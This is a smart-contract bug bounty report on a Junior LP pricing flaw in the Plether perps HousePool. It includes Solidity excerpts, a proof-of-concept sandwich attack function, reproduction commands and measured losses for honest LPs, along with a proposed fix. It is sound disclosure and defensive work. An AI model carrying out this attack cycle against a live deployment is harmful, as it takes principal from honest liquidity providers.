# \#98514 [SC-Critical] LP share pricing ignores outstanding VPI, so a timed Junior LP entry or exit steals honest Junior principal

**Submitted on Nov 8th 2026 at 10:36:52 UTC by @arcomus for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98514
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Junior share pricing ignores unsettled VPI, so an attacker depositing while a rebate is outstanding buys cheap shares and collects most of the clawback other LPs funded. Exiting before a charge is refunded works the same way. A rebate parks pool cash in a locked trader reserve that the lifetime clamp claws back at close. In the PoC at release parameters, an honest LP, bob, deposits 1,000,000 USDG beside the attacker's 9M and redeems 966,074.16 after one live-market day.

## Vulnerability Details

Deposits and redemptions are priced by `buildReconcileSnapshot` (HousePoolAccountingLib.sol:60-78): `pool.totalAssets()` (CfdEngineProtocolLens.sol:63-64) plus the marked price delta, with no VPI term. The rebate on a skew-reducing open is paid from pool cash, so Junior NAV drops by |VPI|, but the same amount is locked in the trader's `vpiRebateReserveBalances` (MarginClearinghouse.sol:49, 851-901) and the clamp at CloseAccountingLib.sol:112-117 forces it back at close. Shares bought in between get the clawback free.

Each 3-hour cycle, the attacker redeems, her account B shorts against her account A's long in the now-shallow pool, she re-deposits, and B closes. The charge side (T1) mirrors it: a positive charge is booked as Junior revenue but refunded at a skew-reducing close, so an LP who exits in between keeps her cut.

```solidity
// HousePoolAccountingLib.sol:63-77, excerpt, comments ours (line 57: "the single canonical terminal-NAV snapshot shared by LP entry and exit pricing")
uint256 terminalAssets = engineSnapshot.physicalAssets;          // pool.totalAssets(), CfdEngineProtocolLens.sol:63-64
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets; // marked price PnL only
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}
// no term for the reserve-backed VPI clawback or the refundable VPI charge
if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

Scan d4541b49 (l.206, l.1693, l.1742) and SECURITY.md:1438 cover traders gaming depth, but depth isn't the lever: re-entering after the close (same exit, same rebate) costs the attacker 810.11 and T1 with depth unchanged earns 2,662.95, per cycle; the fix touches neither depth nor the clamp. The reserve stays out of NAV (SECURITY.md:871-872, ACCOUNTING_SPEC.md:1064-1066) so LPs can't withdraw it (WHITEPAPER.md:887-888); the fix keeps withdrawals physically funded. Known Limitations (SECURITY.md:1328+) omit LP cohort transfers (the spec accepts one only for carry, ACCOUNTING_SPEC.md:737-740). The fix extends PR #62's symmetric NAV, without cohort accounting.

## Impact Details

Critical: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield." At a fixed price, honest Junior LPs redeem less principal than they deposited. Measured in the PoC at DEPLOYMENT.md release parameters, after all LPs redeemed and positions closed (value conserved within 3e-6 USDG):

- One live-market day (8 cycles): bob loses 33,925.84 to the attacker, who keeps 27,373.31 after 6,552.56 in fees.
- 4M Senior, skew sized to the shallow pool: honest Junior -63,500.70 (-6.35%) in 3 cycles.
- No depth change, honest traders only: a standing, free-to-cancel 10M deposit request takes 3,997.57, costing honest LPs 4,016.46.
- T1, 5M Senior, attacker 3.75M vs bob 1.30M Junior: bob -13,310.12, attacker +7,949.52 over 3 cycles; needs her share x skew/depth > 0.16.

She recycles a 9M Junior stake and uses two 50k trader accounts (150k with Senior), no borrowing; a stake equal to honest Junior still pays (+2,306.84, 3 cycles). No other open interest in the window. Solvency caps her skew near 0.99x post-exit depth; the 80% Senior-share cap forces partial exits from cycle 2.

Not measured, but from the same formula: the rebate scales with skew squared over depth and skew can scale with depth, so the take grows with pool size and repeats every 3 hours while markets are open. The largest measured row (T1, 40M Senior cap, attacker 30M vs bob 10M Junior) costs bob 35,722.83 in cycle 1.

## Recommendation

Price outstanding VPI into LP ownership: keep a signed total of live `vpiAccrued` in CfdEngine, and in `buildReconcileSnapshot` add |total| to assets if negative, to liabilities (conservatively, in full) if positive. With `S1_T1_fix.diff` (4 files, +16) the attacker nets -776.51 per cycle (one-day test); only six full-suite checks, which re-derive today's VPI-free NAV, start failing.

```solidity
// HousePoolAccountingLib.buildReconcileSnapshot, after the price delta (full diff in the gist)
int256 lifetimeVpi = engineSnapshot.lifetimeVpiAccruedAssets; // CfdEngine.totalVpiAccruedAssets
if (lifetimeVpi > 0) {
    terminalLiabilities += uint256(lifetimeVpi);               // charge the clamp can still refund
} else if (lifetimeVpi < 0) {
    terminalAssets += uint256(-(lifetimeVpi + 1)) + 1;         // reserve-backed rebate clawback
}
```

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L57-L78
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L59-L64
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L49
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L851-L901
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L117
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md (lines 871-872, 1328, 1438)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md (lines 737-740, 1064-1066)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md (lines 887-888)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md (Initial release parameters, line 123)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md (lines 206, 1693, 1742)
- https://github.com/Plether-Fi/plether-core/pull/62



## Link to Proof of Concept

https://gist.github.com/antonio-rosendo/bc04cd6e9d0d62079677ddd9ce9846c7

## Proof of Concept

## Proof of Concept

Runs in the repo Foundry suite at the frozen commit, no in-scope contract modified:

```
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
git clone -c core.autocrlf=false https://gist.github.com/bc04cd6e9d0d62079677ddd9ce9846c7.git ../plether-gist && export GIST=$(cd ../plether-gist && pwd)
mkdir -p packages/perps/test/perps/poc && cp "$GIST"/Vpi*.t.sol packages/perps/test/perps/poc/
cd packages/perps
FOUNDRY_VIA_IR=false forge test --match-path test/perps/poc/VpiLpCohortSandwich.t.sol -vv
FOUNDRY_VIA_IR=false forge test --match-path test/perps/poc/VpiChargeFirstCohort.t.sol --match-test test_T1_ -vv
git apply "$GIST/S1_T1_fix.diff"   # re-run both: only test_Control_NoChurn, test_Control_ReentryAfterCloseReconciled, test_T1_Control_NoTrade pass
```

The attack path uses only public calls (V3 `commitOrder`/`executeOrder`, `settleLpEpoch`, ERC-7540 request/claim), each pranked as the acting EOA; `setUp` installs and asserts the DEPLOYMENT.md release values. Secret gist: https://gist.github.com/antonio-rosendo/bc04cd6e9d0d62079677ddd9ce9846c7 (tests, fix diff, README). Re-checked 2026-11-08: upstream code unchanged, no PR or issue covers this.

Expected (test_Sandwich_OneDay_EightCycles_Adaptive, end to end):

```
attacker (eve+A+B) : 27373.31
bob                : -33925.84
treasury           : 6552.56
seeds (this)       : -0.03
SUM (conservation) : -2 units (1e-6 USDG)
Suite result: ok. 15 passed; 0 failed; 0 skipped
```

One attack cycle, verbatim from VpiLpCohortSandwich.t.sol:

```solidity
    function _cycleSandwich(
        uint256 i,
        Cfg memory c
    ) internal {
        // Epoch T: eve's redemption is funded at the current NAV; pool becomes shallow.
        _nextEpochSettle();
        uint256 outAssets = _claimRedeem(EVE, pendingRedeemReq);
        assertEq(lastClaimedShares, pendingRedeemShares, "eve's whole exit was funded in one epoch");
        if (!cappedExit) {
            assertEq(juniorVault.balanceOf(EVE), 0, "eve fully redeemed");
        }
        _boundary(i);

        CycleLog storage L = cycleLogs.push();
        L.eveSharesOut = pendingRedeemShares;
        L.eveAssetsOut = outAssets;
        L.eveExitCapped = lastExitCapped;
        L.eveLeftInAssets = juniorVault.convertToAssets(juniorVault.balanceOf(EVE));

        // B opens the skew-reducing SHORT at the shallow depth: the rebate leaves pool cash now.
        uint256 sB = adaptive ? sizeAB : c.sizeB;
        _openRebateLeg(L, sB);

        // eve requests a deposit of everything she holds; it activates at the next boundary.
        uint256 amt = settlementToken.balanceOf(EVE);
        uint256 dep = _requestDeposit(EVE, amt);

        // Epoch T+1h: activation at post-reconcile Junior price, which excludes B's reserved rebate.
        _nextEpochSettle();
        L.eveAssetsIn = amt;
        L.eveSharesIn = _claimDeposit(EVE, dep);
        L.eveShareOfSupplyBps = (juniorVault.balanceOf(EVE) * 10_000) / juniorVault.totalSupply();

        // B closes at full depth; the lifetime clamp forces the full |VPI| back into the pool.
        uint256 p0 = pool.totalAssets();
        _trade(EVE_B, CfdTypes.Side.SHORT, sB, 0, true);
        L.poolInflowAtClose = pool.totalAssets() - p0;
        assertEq(clearinghouse.vpiRebateReserveAssets(EVE_B), 0, "reserve consumed at close");
        (uint256 sizeAfter,,,,,,) = engine.positions(EVE_B);
        assertEq(sizeAfter, 0, "B fully closed");
        if (adaptive) {
            _trimA();
        }

        // Epoch T+2h: reconcile credits the clawback to Junior, now ~90% owned by eve. Request exit for T+3h.
        _nextEpochSettle();
        (pendingRedeemReq, pendingRedeemShares) = _requestRedeemEve();
    }
```
